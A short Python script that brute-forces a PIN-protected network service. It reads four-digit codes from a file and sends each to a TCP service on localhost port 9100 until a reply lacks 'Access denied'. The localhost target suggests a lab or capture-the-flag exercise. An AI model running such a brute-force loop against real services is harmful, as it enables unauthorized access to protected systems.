#!/usr/bin/python

import socket
import time

host = '127.0.0.1'
port = 9100

f = open('4dpin.txt', 'r')
codes = f.readlines()
f.close()

for c in codes:
    print("Code: " + c.strip())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(2048)
    s.send(c)
    res = s.recv(2048)
    print(res.strip())
    if "Access denied" not in res:
        s.close()
        break
    s.close()
